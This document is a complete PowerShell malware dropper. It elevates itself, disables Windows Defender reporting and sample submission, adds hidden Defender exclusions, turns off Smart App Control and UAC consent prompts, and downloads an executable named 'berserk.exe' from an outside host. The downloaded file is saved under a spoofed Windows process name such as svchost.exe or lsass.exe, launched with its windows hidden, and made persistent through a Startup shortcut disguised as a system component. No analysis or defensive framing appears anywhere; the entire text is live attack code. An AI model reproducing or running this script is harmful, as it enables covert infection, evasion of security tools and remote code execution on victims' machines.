$config = @(
    @{ Url = "https://1.fcitt.cc/berserk.exe"; Startup = $true }
)

$targets = @()
foreach ($item in $config) {
    if ($item.Url -and $item.Url.Trim()) {
        $targets += @{
            Url = $item.Url.Trim().Replace('"','')
            Startup = [bool]$item.Startup
        }
    }
}

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    $s2 = @'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$targets = @(
__TARGETS__
)

$defPolicy = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$exPaths = "$defPolicy\Exclusions\Paths"
$exExts = "$defPolicy\Exclusions\Extensions"
foreach ($k in @($defPolicy,$exPaths,$exExts,"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet","HKLM:\SOFTWARE\Microsoft\Windows Defender\SpyNet")) {
    try { if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null } } catch {}
}
foreach ($k in @("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet","HKLM:\SOFTWARE\Microsoft\Windows Defender\SpyNet")) {
    try { Set-ItemProperty -Path $k -Name "SpyNetReporting" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { Set-ItemProperty -Path $k -Name "SubmitSamplesConsent" -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
}
try { Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}
foreach ($p in @($env:TEMP,$env:APPDATA,"$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")) {
    try { Set-ItemProperty -Path $exPaths -Name $p -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue } catch {}
}
foreach ($e in @("*.exe","*.ps1")) {
    try { Set-ItemProperty -Path $exExts -Name $e -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { Add-MpPreference -ExclusionExtension $e -Force -ErrorAction SilentlyContinue } catch {}
}
try { Set-ItemProperty -Path $defPolicy -Name "HideExclusionsUI" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path $defPolicy -Name "HideExclusionsFromLocalAdmins" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path $defPolicy -Name "HideExclusionsFromLocalUsers" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}

foreach ($k in @("HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy","HKLM:\SYSTEM\CurrentControlSet\Control\CI\Protected")) {
    try { if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null } } catch {}
}
try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Protected" -Name "VerifiedAndReputablePolicyStateMinValueSeen" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name "SacLearningModeSwitch" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { echo "STOP" | citool -r 2>$null | Out-Null } catch {}

try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorUser" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableInstallerDetection" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}

Start-Sleep -Seconds 10

$payloadDir = $env:TEMP
$startupDir = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
try { if (-not (Test-Path $startupDir)) { New-Item -ItemType Directory -Path $startupDir -Force | Out-Null } } catch {}

try { $wc = New-Object System.Net.WebClient } catch { $wc = $null }
try { $wsh = New-Object -ComObject WScript.Shell } catch { $wsh = $null }

$launcherPath = Join-Path $env:TEMP "launcher.ps1"
$launcherContent = 'param([string]$Path)' + "`r`n" +
'if (-not ("H.W32" -as [type])) {' + "`r`n" +
'    Add-Type -Name W32 -Namespace H -MemberDefinition ''[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("user32.dll")] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam); [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId); public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam); public static void HideAll(uint pid) { EnumWindows(delegate(IntPtr hWnd, IntPtr lParam) { uint p; GetWindowThreadProcessId(hWnd, out p); if (p == pid) ShowWindow(hWnd, 0); return true; }, IntPtr.Zero); }''' + "`r`n" +
'}' + "`r`n" +
'$p = Start-Process -FilePath $Path -WindowStyle Hidden -PassThru' + "`r`n" +
'try { $p.WaitForInputIdle(4000) } catch {}' + "`r`n" +
'for ($i = 0; $i -lt 24; $i++) {' + "`r`n" +
'    Start-Sleep -Milliseconds 250' + "`r`n" +
'    try { $p.Refresh() } catch {}' + "`r`n" +
'    try { [H.W32]::HideAll([uint32]$p.Id) } catch {}' + "`r`n" +
'}'
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII

function Start-Hidden {
    param([string]$Path)
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`" -Path `"$Path`"" -WindowStyle Hidden
}

$exeNames = @(
    'svchost.exe',
    'csrss.exe',
    'lsass.exe',
    'winlogon.exe',
    'dwm.exe',
    'explorer.exe',
    'taskmgr.exe',
    'services.exe',
    'smss.exe',
    'spoolsv.exe'
)

$dirNames = @(
    'MicrosoftEdge',
    'Windows Defender',
    'Windows Mail',
    'Windows Media Player',
    'Microsoft Shared',
    'Internet Explorer',
    'Windows Photo Viewer',
    'Microsoft.NET',
    'Windows Portable Devices',
    'Windows Security'
)

$lnkNames = @(
    'WindowsUpdate.lnk',
    'MicrosoftEdgeUpdate.lnk',
    'OneDriveSync.lnk',
    'GameBar.lnk',
    'SecurityHealth.lnk',
    'WindowsDefender.lnk',
    'MicrosoftEdge.lnk',
    'WindowsMail.lnk',
    'TaskManager.lnk',
    'WindowsTerminal.lnk'
)

$usedLnk = @{}
$usedDir = @{}
$usedExe = @{}

foreach ($target in $targets) {
    $url = $target.Url
    $wantStartup = $target.Startup
    
    try {
        $ei = -1
        if ($usedExe.Count -ge $exeNames.Count) { 
            $ei = Get-Random -Maximum $exeNames.Count 
        } else { 
            do { $ei = Get-Random -Maximum $exeNames.Count } while ($usedExe.ContainsKey($ei)) 
            $usedExe[$ei] = $true 
        }

        $di = -1
        if ($usedDir.Count -ge $dirNames.Count) { 
            $di = Get-Random -Maximum $dirNames.Count 
        } else { 
            do { $di = Get-Random -Maximum $dirNames.Count } while ($usedDir.ContainsKey($di)) 
            $usedDir[$di] = $true 
        }

        $fd = Join-Path $payloadDir $dirNames[$di]
        try { if (-not (Test-Path $fd)) { New-Item -ItemType Directory -Path $fd -Force | Out-Null } } catch {}
        
        $fp = Join-Path $fd $exeNames[$ei]
        
        $wc.DownloadFile($url, $fp)
        
        if (Test-Path $fp) {
            if ($wantStartup) {
                $li = -1
                if ($usedLnk.Count -ge $lnkNames.Count) { 
                    $li = Get-Random -Maximum $lnkNames.Count 
                } else { 
                    do { $li = Get-Random -Maximum $lnkNames.Count } while ($usedLnk.ContainsKey($li)) 
                    $usedLnk[$li] = $true 
                }
                
                $lp = Join-Path $startupDir $lnkNames[$li]
                
                $sc = $wsh.CreateShortcut($lp)
                $sc.TargetPath = $fp
                $sc.Arguments = ""
                $sc.WorkingDirectory = $fd
                $sc.WindowStyle = 7
                $sc.Save()
            }
            
            Start-Hidden $fp
        }
    } catch {}
}
'@

    $targetsSerialized = $targets | ForEach-Object {
        "@{ Url = `"$($_.Url)`"; Startup = `$$(($_.Startup -eq $true)) }"
    }
    $s2 = $s2.Replace('__TARGETS__', ($targetsSerialized -join "`r`n"))
    
    $s2p = Join-Path $env:TEMP "stage2.ps1"
    [System.IO.File]::WriteAllText($s2p, $s2)
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$s2p`"" -Verb RunAs
    exit
}

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$defPolicy = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$exPaths = "$defPolicy\Exclusions\Paths"
$exExts = "$defPolicy\Exclusions\Extensions"
foreach ($k in @($defPolicy,$exPaths,$exExts,"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet","HKLM:\SOFTWARE\Microsoft\Windows Defender\SpyNet")) {
    try { if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null } } catch {}
}
foreach ($k in @("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet","HKLM:\SOFTWARE\Microsoft\Windows Defender\SpyNet")) {
    try { Set-ItemProperty -Path $k -Name "SpyNetReporting" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { Set-ItemProperty -Path $k -Name "SubmitSamplesConsent" -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
}
try { Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}
foreach ($p in @($env:TEMP,$env:APPDATA,"$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")) {
    try { Set-ItemProperty -Path $exPaths -Name $p -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue } catch {}
}
foreach ($e in @("*.exe","*.ps1")) {
    try { Set-ItemProperty -Path $exExts -Name $e -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { Add-MpPreference -ExclusionExtension $e -Force -ErrorAction SilentlyContinue } catch {}
}
try { Set-ItemProperty -Path $defPolicy -Name "HideExclusionsUI" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path $defPolicy -Name "HideExclusionsFromLocalAdmins" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path $defPolicy -Name "HideExclusionsFromLocalUsers" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}

foreach ($k in @("HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy","HKLM:\SYSTEM\CurrentControlSet\Control\CI\Protected")) {
    try { if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null } } catch {}
}
try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Protected" -Name "VerifiedAndReputablePolicyStateMinValueSeen" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name "SacLearningModeSwitch" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { echo "STOP" | citool -r 2>$null | Out-Null } catch {}

try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorUser" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableInstallerDetection" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}

Start-Sleep -Seconds 10

$payloadDir = $env:TEMP
$startupDir = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
try { if (-not (Test-Path $startupDir)) { New-Item -ItemType Directory -Path $startupDir -Force | Out-Null } } catch {}

try { $wc = New-Object System.Net.WebClient } catch { $wc = $null }
try { $wsh = New-Object -ComObject WScript.Shell } catch { $wsh = $null }

$launcherPath = Join-Path $env:TEMP "launcher.ps1"
$launcherContent = 'param([string]$Path)' + "`r`n" +
'if (-not ("H.W32" -as [type])) {' + "`r`n" +
'    Add-Type -Name W32 -Namespace H -MemberDefinition ''[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("user32.dll")] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam); [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId); public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam); public static void HideAll(uint pid) { EnumWindows(delegate(IntPtr hWnd, IntPtr lParam) { uint p; GetWindowThreadProcessId(hWnd, out p); if (p == pid) ShowWindow(hWnd, 0); return true; }, IntPtr.Zero); }''' + "`r`n" +
'}' + "`r`n" +
'$p = Start-Process -FilePath $Path -WindowStyle Hidden -PassThru' + "`r`n" +
'try { $p.WaitForInputIdle(4000) } catch {}' + "`r`n" +
'for ($i = 0; $i -lt 24; $i++) {' + "`r`n" +
'    Start-Sleep -Milliseconds 250' + "`r`n" +
'    try { $p.Refresh() } catch {}' + "`r`n" +
'    try { [H.W32]::HideAll([uint32]$p.Id) } catch {}' + "`r`n" +
'}'
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII

function Start-Hidden {
    param([string]$Path)
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`" -Path `"$Path`"" -WindowStyle Hidden
}

$exeNames = @(
    'svchost.exe',
    'csrss.exe',
    'lsass.exe',
    'winlogon.exe',
    'dwm.exe',
    'explorer.exe',
    'taskmgr.exe',
    'services.exe',
    'smss.exe',
    'spoolsv.exe'
)

$dirNames = @(
    'MicrosoftEdge',
    'Windows Defender',
    'Windows Mail',
    'Windows Media Player',
    'Microsoft Shared',
    'Internet Explorer',
    'Windows Photo Viewer',
    'Microsoft.NET',
    'Windows Portable Devices',
    'Windows Security'
)

$lnkNames = @(
    'WindowsUpdate.lnk',
    'MicrosoftEdgeUpdate.lnk',
    'OneDriveSync.lnk',
    'GameBar.lnk',
    'SecurityHealth.lnk',
    'WindowsDefender.lnk',
    'MicrosoftEdge.lnk',
    'WindowsMail.lnk',
    'TaskManager.lnk',
    'WindowsTerminal.lnk'
)

$usedLnk = @{}
$usedDir = @{}
$usedExe = @{}

foreach ($target in $targets) {
    $url = $target.Url
    $wantStartup = $target.Startup
    
    try {
        $ei = -1
        if ($usedExe.Count -ge $exeNames.Count) { 
            $ei = Get-Random -Maximum $exeNames.Count 
        } else { 
            do { $ei = Get-Random -Maximum $exeNames.Count } while ($usedExe.ContainsKey($ei)) 
            $usedExe[$ei] = $true 
        }

        $di = -1
        if ($usedDir.Count -ge $dirNames.Count) { 
            $di = Get-Random -Maximum $dirNames.Count 
        } else { 
            do { $di = Get-Random -Maximum $dirNames.Count } while ($usedDir.ContainsKey($di)) 
            $usedDir[$di] = $true 
        }

        $fd = Join-Path $payloadDir $dirNames[$di]
        try { if (-not (Test-Path $fd)) { New-Item -ItemType Directory -Path $fd -Force | Out-Null } } catch {}
        
        $fp = Join-Path $fd $exeNames[$ei]
        
        $wc.DownloadFile($url, $fp)
        
        if (Test-Path $fp) {
            if ($wantStartup) {
                $li = -1
                if ($usedLnk.Count -ge $lnkNames.Count) { 
                    $li = Get-Random -Maximum $lnkNames.Count 
                } else { 
                    do { $li = Get-Random -Maximum $lnkNames.Count } while ($usedLnk.ContainsKey($li)) 
                    $usedLnk[$li] = $true 
                }
                
                $lp = Join-Path $startupDir $lnkNames[$li]
                
                $sc = $wsh.CreateShortcut($lp)
                $sc.TargetPath = $fp
                $sc.Arguments = ""
                $sc.WorkingDirectory = $fd
                $sc.WindowStyle = 7
                $sc.Save()
            }
            
            Start-Hidden $fp
        }
    } catch {}
}